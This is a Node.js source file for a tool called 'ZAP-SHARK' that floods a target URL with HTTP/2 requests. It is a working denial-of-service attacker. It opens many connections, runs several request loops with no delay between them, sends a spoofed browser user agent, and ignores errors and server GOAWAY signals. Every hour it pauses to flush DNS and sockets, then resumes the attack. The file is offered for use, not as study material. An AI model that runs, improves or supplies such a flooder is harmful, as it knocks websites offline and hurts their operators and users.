const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.clients = [];
        this.maxClients = 10; // Multiple connections for max speed
    }

    createClient() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 1000000,
                maxHeaderListPairs: 10000
            });
            
            client.on('error', () => {
                // Ignore all errors - keep going
                setTimeout(() => this.createClient(), 100);
            });
            
            client.on('goaway', () => {
                // Ignore goaway - recreate connection
                setTimeout(() => this.createClient(), 100);
            });
            
            this.clients.push(client);
            return client;
        } catch (err) {
            setTimeout(() => this.createClient(), 100);
        }
    }

    sendRequest() {
        const client = this.clients[Math.floor(Math.random() * this.clients.length)] || this.createClient();
        if (!client) return;

        try {
            const req = client.request({ 
                ':method': 'GET', 
                ':path': '/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            });
            
            req.on('response', () => {
                // Don't wait for response - just destroy immediately
                req.destroy();
            });
            
            req.on('error', () => {
                req.destroy();
            });
            
            // Send and forget - no waiting
            req.end();
            
        } catch (err) {
            // Ignore all errors
        } finally {
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK: (${this.formatRuntime()}) | (${this.status})`);
        console.log('======================================');
        console.log(`T-ARP — ${this.totalRequests}`);
        console.log(`ARPS-S — ${this.currentRPS.toFixed(1)}`);
        console.log('======================================');
        console.log('©ZAP-SHARK — 2023 | V1');
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns', () => {});
        } else {
            exec('sudo dscacheutil -flushcache || sudo systemd-resolve --flush-caches', () => {});
        }
    }

    flushSockets() {
        this.clients.forEach(client => {
            try {
                client.destroy();
            } catch (err) {}
        });
        this.clients = [];
        
        // Recreate clients
        for (let i = 0; i < this.maxClients; i++) {
            setTimeout(() => this.createClient(), i * 100);
        }
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            this.status = "PAUSED";
            
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                this.resumeAttack();
            }, this.maintenanceDuration);
            
            this.lastMaintenance = currentTime;
        }
    }

    resumeAttack() {
        this.status = "ATTACKING";
        this.lastMaintenance = Date.now();
    }

    startAttack() {
        // ULTIMATE SPEED - minimal delay with multiple concurrent loops
        const attackLoops = 5; // Multiple attack loops for max resource usage
        
        for (let i = 0; i < attackLoops; i++) {
            setImmediate(() => {
                const attack = () => {
                    if (this.status === "ATTACKING") {
                        this.sendRequest();
                        setImmediate(attack); // No delay - maximum speed
                    }
                };
                attack();
            });
        }
    }

    async start() {
        // Clear terminal 2x
        process.stdout.write('\x1B[2J\x1B[0f');
        process.stdout.write('\x1B[2J\x1B[0f');
        
        // Create multiple HTTP/2 clients
        for (let i = 0; i < this.maxClients; i++) {
            setTimeout(() => this.createClient(), i * 50);
        }
        
        // Start attack after brief setup
        setTimeout(() => {
            this.startAttack();
        }, 1000);
        
        // Update display
        setInterval(() => {
            this.updateDisplay();
        }, 100);
        
        // Maintenance checker
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        process.on('SIGINT', () => {
            this.stop();
        });
    }

    stop() {
        this.running = false;
        this.clients.forEach(client => {
            try {
                client.destroy();
            } catch (err) {}
        });
        process.exit(0);
    }
}

// Usage
const target = process.argv[2] || 'https://example.com';
const shark = new ZAPSHARK(target);
shark.start();
